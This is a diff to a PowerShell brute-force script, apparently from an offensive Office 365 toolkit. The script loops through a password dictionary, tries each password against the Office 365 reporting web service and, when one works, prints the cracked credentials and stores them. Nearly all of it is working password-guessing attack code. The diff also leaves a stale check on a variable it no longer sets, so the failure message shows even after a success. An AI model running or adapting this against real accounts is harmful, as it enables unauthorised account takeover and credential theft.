@@ -1,5 +1,5 @@
 ###Primary Bruteforce function
-function BruteForce ($username){
+function BruteForce ($target_account){
     #Check file input
     $check_file = $false
     while ($check_file -eq $false) {
@@ -40,7 +40,7 @@ function BruteForce ($username){
     #Read input password file
     $passwords = Get-Content -Path .\$filename
 
-    Write-Host "`nStarting brute-force on user: $username using the password dictionary: $filename..."
+    Write-Host "`nStarting brute-force on user: $target_account using the password dictionary: $filename..."
     [int]$counter = 0
     Write-Progress -Activity "Running brute force" -Status "0% complete:" -PercentComplete 0;
 
@@ -50,22 +50,19 @@ function BruteForce ($username){
         $securestring = ConvertTo-SecureString $password -AsPlainText -Force
 
         #Create PSCredential object
-        $credential = New-Object System.Management.Automation.PSCredential -ArgumentList ($username, $securestring)
+        $credential = New-Object System.Management.Automation.PSCredential -ArgumentList ($target_account, $securestring)
 
         #Test authentication to Office 365 reporting API
         try {
             Invoke-WebRequest -Uri "https://reports.office365.com/ecp/reportingwebservice/reporting.svc" -Credential $credential -UseBasicParsing | Out-Null
 
-            #Create custom object
-            $userobject = New-Object -TypeName psobject
-            $userobject | Add-Member -MemberType NoteProperty -Name "UserName" -Value $username
-            $userobject | Add-Member -MemberType NoteProperty -Name "Password" -Value $password
-            
-            Write-Host "`nSuccess is No Accident ;) Successfully cracked account password!!!" -ForegroundColor Yellow -BackgroundColor Black
-            $userobject | Format-Table 
-            $userobject | Out-File -FilePath .\Outputs\External_BruteForce_Result.txt
-            break
+            Write-Host "Username: $target_account"
+            Write-Host "Password: $password"
+            Write-Host "`n[Success] Cracked account password" -ForegroundColor Yellow
 
+            #Save to cracked credntial to credential store
+            AddCredentials "password" "BF_$target_account-$(([DateTimeOffset](Get-Date)).ToUnixTimeSeconds())" $target_account $password
+            break
         } 
         catch {
             $counter++
@@ -74,7 +71,7 @@ function BruteForce ($username){
     }
     #Print if brute-force unsuccessful
     if ($userobject -eq $null){
-        Write-Host "`nBrute-force Unsuccessful!!! Try another password dictionary or account!!!" -ForegroundColor Yellow -BackgroundColor Black
+        Write-Host "`nPassword not found. Try another password dictionary or account" -ForegroundColor Yellow
     }
     Pause
 }
@@ -85,9 +82,9 @@ function InternalBruteForce {
 
     #Get account to target
     EnterAccount ("`nEnter an account to brute-force (eg:user@org.com) or enter 'recon' to find all available accounts")
-    $username = $global:account_username
+    $target_account = $global:account_username
 
-    BruteForce($username)
+    BruteForce($target_account)
 }
 
 ###External Bruteforce function
@@ -96,8 +93,8 @@ function ExternalBruteForce {
 
     #Get account to target
     do {
-        $username = Read-Host -Prompt "`nEnter an account to brute-force (eg:user@org.com)"
-    } until ("" -ne $username)
+        $target_account = Read-Host -Prompt "`nEnter an account to brute-force (eg:user@org.com)"
+    } until ("" -ne $target_account)
 
-    BruteForce($username)
+    BruteForce($target_account)
 }
